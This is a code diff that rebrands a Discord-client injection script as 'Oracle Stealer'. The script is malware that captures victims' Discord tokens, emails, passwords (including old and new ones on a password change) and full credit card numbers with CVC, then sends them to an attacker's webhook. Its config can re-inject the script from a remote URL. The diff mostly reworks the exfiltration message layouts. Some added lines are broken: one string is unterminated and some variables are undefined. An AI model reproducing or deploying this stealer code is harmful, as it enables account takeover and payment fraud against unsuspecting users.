@@ -5,16 +5,16 @@ const querystring = require("querystring");
 const { BrowserWindow, session } = require("electron");
 
 const config = {
-  auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
+  auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
   ping_val: "@everyone", //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: "Discord Injection", //name of the webhook thats gonna send the info
+    embed_name: "Oracle Injection", //name of the webhook thats gonna send the info
   embed_icon:
     "https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png".replace(
       / /g,
       "%20",
     ), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
-  embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
+  embed_color: 3553599, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   webhook: "%WEBHOOK%", //your discord webhook there obviously
   injection_url: "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js", //injection url for when it reinjects
   /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
@@ -191,18 +191,18 @@ const fetchBilling = async (token) => {
 
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
-  if (data === "") return "❌";
+  if (data === "") return "\`None\`";
   let billing = "";
   data.forEach((x) => {
     if (x.type === 2 && !x.invalid) {
-      billing += "✅" + " <:paypal:951139189389410365>";
+      billing += "\`Valid:\`" + " <:paypal:951139189389410365>";
     } else if (x.type === 1 && !x.invalid) {
-      billing += "✅" + " 💳";
+      billing += "\`Valid:\`" + " 💳";
     } else {
-      billing = "❌";
+      billing = "\`True\`";
     }
   });
-  if (billing === "") billing = "❌";
+  if (billing === "") billing = "\`None\`";
   return billing;
 };
 
@@ -336,27 +336,42 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: "**Account Info**",
-            value: `Email: **${email}** - Password: **${password}**`,
+            name: json.username + "#" + json.discriminator + "(" + json.id + ")",
+            value: `\`\`\`${token}\`\`\``,
             inline: false,
           },
           {
-            name: "**Discord Info**",
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: false,
+            name: "**Badges:**",
+            value: `${badges}`,
+            inline: true,
           },
           {
-            name: "**Token**",
-            value: `\`${token}\``,
-            inline: false,
+            name: "**Nitro:**",
+            value: `${nitro}`,
+            inline: true,
+          },
+          {
+            name: "**Email:**",
+            value: `\`${email}\``,
+            inline: true,
+          },
+          {
+            name: "**Password:**",
+            value: `\`${password}\``,
+            inline: true,
+          },
+          {
+            name: "**Billing:**",
+            value: `${billing}`,
+            inline: true,
           },
         ],
         author: {
-          name: json.username + "#" + json.discriminator + " | " + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          name: "Oracle Stealer",
+          icon_url: `https://cdn.discordapp.com/attachments/970982305021706303/971383656453144627/OracleLogo.jpg`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "@Rdimo#6969",
         },
       },
     ],
@@ -378,27 +393,47 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: "**Password Changed**",
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
-            inline: true,
-          },
-          {
-            name: "**Discord Info**",
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: "**Token**",
-            value: `\`${token}\``,
+            name: json.username + "#" + json.discriminator + "(" + json.id + ")",
+            value: `\`\`\`${token}\`\`\``,
             inline: false,
+          },
+          {
+            name: "**Badges:**",
+            value: `${badges}`,
+            inline: true,
+          },
+          {
+            name: "**Nitro:**",
+            value: `${nitro}`,
+            inline: true,
+          },
+          {
+            name: "**Email:**",
+            value: `\`${json.email}\``,
+            inline: true,
+          },
+          {
+            name: "**Old Password:**",
+            value: `\`${oldpassword}\``,
+            inline: true,
+          },
+          {
+            name: "**New Password:**",
+            value: `\`${newpassword}\``,
+            inline: true,
+          },
+          {
+            name: "**Billing:**",
+            value: `${billing}`,
+            inline: true,
           },
         ],
         author: {
-          name: json.username + "#" + json.discriminator + " | " + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          name: "Oracle Stealer",
+          icon_url: `https://cdn.discordapp.com/attachments/970982305021706303/971383656453144627/OracleLogo.jpg`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "@Rdimo#6969",
         },
       },
     ],
@@ -420,27 +455,42 @@ const emailChanged = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: "**Email Changed**",
-            value: `New Email: **${email}**\nPassword: **${password}**`,
-            inline: true,
-          },
-          {
-            name: "**Discord Info**",
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: "**Token**",
-            value: `\`${token}\``,
+            name: json.username + "#" + json.discriminator + "(" + json.id + ")",
+            value: `\`\`\`${token}\`\`\``,
             inline: false,
+          },
+          {
+            name: "**Badges:**",
+            value: `${badges}`,
+            inline: true,
+          },
+          {
+            name: "**Nitro:**",
+            value: `${nitro}`,
+            inline: true,
+          },
+          {
+            name: "**Email:**",
+            value: `\`${email}\``,
+            inline: true,
+          },
+          {
+            name: "**Password:**",
+            value: `\`${password}\``,
+            inline: true,
+          },
+          {
+            name: "**Billing:**",
+            value: `${billing}`,
+            inline: true,
           },
         ],
         author: {
-          name: json.username + "#" + json.discriminator + " | " + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          name: "Oracle Stealer",
+          icon_url: `https://cdn.discordapp.com/attachments/970982305021706303/971383656453144627/OracleLogo.jpg`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "@Rdimo#6969",
         },
       },
     ],
@@ -462,27 +512,42 @@ const PaypalAdded = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: "**Paypal Added**",
-            value: `Time to buy some nitro baby 😩`,
+            name: json.username + "#" + json.discriminator + "(" + json.id + ")",
+            value: `\`\`\`${token}\`\`\``,
             inline: false,
           },
           {
-            name: "**Discord Info**",
-            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: false,
+            name: "**Badges:**",
+            value: `${badges}`,
+            inline: true,
           },
           {
-            name: "**Token**",
-            value: `\`${token}\``,
-            inline: false,
+            name: "**Nitro:**",
+            value: `${nitro}`,
+            inline: true,
+          },
+          {
+            name: "**Email:**",
+            value: `\`${email}\``,
+            inline: true,
+          },
+          {
+            name: "**Password:**",
+            value: `\`${password}\``,
+            inline: true,
+          },
+          {
+            name: "**Billing:**",
+            value: "PayPal Added,
+            inline: true,
           },
         ],
         author: {
-          name: json.username + "#" + json.discriminator + " | " + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          name: "Oracle Stealer",
+          icon_url: `https://cdn.discordapp.com/attachments/970982305021706303/971383656453144627/OracleLogo.jpg`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "@Rdimo#6969",
         },
       },
     ],
@@ -504,27 +569,42 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: "**Credit Card Added**",
-            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
+            name: json.username + "#" + json.discriminator + "(" + json.id + ")",
+            value: `\`\`\`${token}\`\`\``,
+            inline: false,
+          },
+          {
+            name: "**Badges:**",
+            value: `${badges}`,
             inline: true,
           },
           {
-            name: "**Discord Info**",
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: "**Nitro:**",
+            value: `${nitro}`,
             inline: true,
           },
           {
-            name: "**Token**",
-            value: `\`${token}\``,
+            name: "**Email:**",
+            value: `\`${email}\``,
+            inline: true,
+          },
+          {
+            name: "**Password:**",
+            value: `\`${password}\``,
+            inline: true,
+          },
+          {
+            name: "**Credit Card:**",
+            value: `${number} | ${expir_month}/${expir_year} | ${cvc}`,
             inline: false,
           },
         ],
         author: {
-          name: json.username + "#" + json.discriminator + " | " + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          name: "Oracle Stealer",
+          icon_url: `https://cdn.discordapp.com/attachments/970982305021706303/971383656453144627/OracleLogo.jpg`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "@Rdimo#6969",
         },
       },
     ],
